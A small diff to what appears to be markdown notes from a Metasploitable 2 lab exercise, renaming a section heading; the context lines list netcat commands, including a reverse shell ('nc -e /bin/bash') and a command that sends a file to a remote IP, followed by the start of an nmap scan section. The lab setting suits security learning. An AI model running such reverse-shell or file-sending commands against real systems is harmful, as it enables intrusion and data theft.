@@ -43,7 +43,7 @@
 - ***nc -e /bin/bash [IP address] 1234*** - This executes the bash shell and sends the output to the local machine listening on port 1234
 - ***nc [IP address] 1234 < file_to_send.txt*** - The command sends a ***file_to_send.txt*** to a specific IP on port 1234
 
-## 🛡️ Metasploitable 2 - 192.168.56.103
+## 🛡️ Metasploitable 2 Results & Recommendations
 ### NMAP
 **1. nmap -p 1-1000 192.168.56.103**
 ```
